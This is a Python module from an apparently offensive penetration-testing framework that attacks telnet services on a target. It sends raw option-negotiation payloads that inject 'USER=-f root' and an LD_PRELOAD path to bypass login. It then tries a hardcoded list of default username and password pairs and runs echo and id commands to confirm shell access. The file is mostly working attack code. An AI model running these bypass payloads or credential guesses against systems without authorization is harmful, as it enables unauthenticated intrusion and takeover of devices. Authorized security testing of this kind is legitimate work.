#!/usr/bin/env python3
"""
Telnet Auth Bypass & Default Credentials Checker
Tests multiple telnet bypass vectors and default credential pairs.
"""
import sys
import os
import socket
import time

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.base_module import BaseModule
from utils.colors import *


class TelnetBypassModule(BaseModule):
    """Telnet Auth Bypass & Default Credentials Checker"""

    def __init__(self, frontdoor):
        super().__init__(frontdoor)
        self.name = "Telnet Auth Bypass"
        self.port = 23

    def run(self):
        """Validate telnet authentication posture with multiple vectors."""
        module_name = "Telnet Auth Bypass"
        target = self.get_target()

        print(f"\n[*] Testing {target}:23 for Telnet...")

        if not self.check_port(23, timeout=3):
            self.log(module_name, "ERROR", "Port 23 closed")
            return

        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, 23))

            banner = self._recv_text(sock)
            if banner:
                self.log(module_name, "INFO", f"Telnet banner: {banner[:100].strip()}")

            # Handle telnet option negotiation
            self._handle_negotiation(sock)

            # Vector 1: Classic telnetd env variable injection (old Linux/FreeBSD)
            if self._test_env_injection(sock, module_name):
                sock.close()
                return

            # Vector 2: Default credentials
            sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock2.settimeout(5)
            sock2.connect((target, 23))
            self._recv_text(sock2)  # consume banner
            self._handle_negotiation(sock2)

            if self._test_default_credentials(sock2, module_name):
                sock2.close()
                sock.close()
                return

            sock2.close()

            # If we got here, telnet is running but we couldn't bypass it
            self.report_validation(
                module_name,
                "Telnet unauthenticated access",
                False,
                "telnet service requires interactive authentication",
            )
            self.log(module_name, "INFO",
                     "Note: telnet transmits credentials in cleartext - "
                     "even if auth is required, credentials can be sniffed on the network")

        except socket.timeout:
            self.log(module_name, "ERROR", "Telnet validation timed out")
        except Exception as e:
            self.log(module_name, "ERROR", f"Telnet validation failed: {str(e)}")
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

    def _recv_text(self, sock, size=4096):
        """Receive text, stripping telnet IAC sequences."""
        try:
            data = sock.recv(size)
            if not data:
                return ""
            # Strip IAC command sequences (0xFF XX)
            cleaned = bytearray()
            i = 0
            while i < len(data):
                if data[i] == 0xFF and i + 1 < len(data):
                    cmd = data[i + 1]
                    if cmd in (0xFB, 0xFC, 0xFD, 0xFE):
                        # WILL/WONT/DO/DONT - 3-byte sequence
                        i += 3
                        continue
                    elif cmd == 0xFF:
                        # Escaped 0xFF
                        cleaned.append(0xFF)
                        i += 2
                        continue
                    else:
                        i += 2
                        continue
                cleaned.append(data[i])
                i += 1
            return cleaned.decode("utf-8", errors="ignore")
        except Exception:
            return ""

    def _handle_negotiation(self, sock):
        """Refuse all telnet options to reach the login prompt."""
        try:
            # Send WONT for common options and DONT to refuse server's DOs
            options = [1, 3, 24, 31, 32, 33, 34, 35, 36, 39]
            for opt in options:
                # IAC WONT option
                sock.sendall(bytes([0xFF, 0xFC, opt]))
                # IAC DONT option
                sock.sendall(bytes([0xFF, 0xFE, opt]))
            time.sleep(0.3)
            # Drain any remaining negotiation
            self._recv_text(sock)
        except Exception:
            pass

    def _test_env_injection(self, sock, module_name):
        """Test telnetd environment variable injection bypasses.

        Historical telnetd implementations allowed environment variable
        injection before authentication. The most well-known vectors:
        - USER=-f root (FreeBSD telnetd)
        - Various LD_* variable injections
        """
        bypass_vectors = [
            # FreeBSD telnetd env injection
            bytes([0xFF, 0xFA, 0x27, 0x01, 0x00, 0x03, 0xFF, 0xF0])
            + b"USER=-f root\r\n",
            # Newline before username
            b"\r\nroot\r\n",
            # Environment variable injection variants
            bytes([0xFF, 0xFA, 0x27, 0x00, 0x00, 0x03, 0xFF, 0xF0])
            + b"LD_PRELOAD=/tmp/payload.so\r\n",
        ]

        marker = "DOORKICK_TELNET_OK"

        for i, payload in enumerate(bypass_vectors):
            try:
                # Reset connection for each attempt
                sock.sendall(payload)
                time.sleep(0.7)
                response = self._recv_text(sock)

                if marker not in response:
                    sock.sendall(f"echo {marker}\r\n".encode())
                    time.sleep(0.7)
                    response = self._recv_text(sock)

                if marker in response:
                    self.report_validation(
                        module_name,
                        "Telnet command execution",
                        True,
                        f"bypass vector {i+1} provided shell access",
                    )
                    # Try to identify user
                    sock.sendall(b"id\r\n")
                    time.sleep(0.5)
                    id_out = self._recv_text(sock)
                    if id_out:
                        self.log(module_name, "INFO",
                                 f"id output: {id_out[:120].strip()}")
                    self.log(module_name, "RCE_POSSIBLE",
                             "Telnet bypass provides unauthenticated shell access")
                    return True

                # Check if we got a login prompt (bypass didn't work)
                if "login" in response.lower() or "password" in response.lower():
                    return False

            except Exception:
                continue

        return False

    def _test_default_credentials(self, sock, module_name):
        """Test common telnet default credentials."""
        credentials = [
            ("root", "root"),
            ("root", ""),
            ("admin", "admin"),
            ("admin", "password"),
            ("root", "admin"),
            ("root", "password"),
            ("cisco", "cisco"),
            ("user", "user"),
            ("test", "test"),
            ("operator", "operator"),
        ]

        marker = "DOORKICK_TELNET_OK"

        for username, password in credentials:
            try:
                response = self._recv_text(sock)
                # Send username
                sock.sendall(f"{username}\r\n".encode())
                time.sleep(0.5)
                response = self._recv_text(sock)

                if "password" not in response.lower() and "passw" not in response.lower():
                    continue

                # Send password
                sock.sendall(f"{password}\r\n".encode())
                time.sleep(0.7)
                response = self._recv_text(sock)

                # Check for successful login
                sock.sendall(f"echo {marker}\r\n".encode())
                time.sleep(0.5)
                response = self._recv_text(sock)

                if marker in response:
                    display_pw = "(blank)" if password == "" else password
                    self.report_validation(
                        module_name,
                        "Telnet default credentials",
                        True,
                        f"{username}/{display_pw} - shell access confirmed",
                    )
                    self.log(module_name, "RCE_POSSIBLE",
                             "Telnet provides unauthenticated shell access via default creds")
                    return True

                # Check for failure
                if "login incorrect" in response.lower() or "failed" in response.lower():
                    continue

                # If neither success nor failure, might be a menu-based system
                if response and "login" not in response.lower():
                    self.log(module_name, "SUSPECTED",
                             f"Unexpected response for {username} - may have succeeded")

            except socket.timeout:
                self.log(module_name, "ERROR", "Telnet credential test timed out")
                return False
            except Exception:
                continue

        return False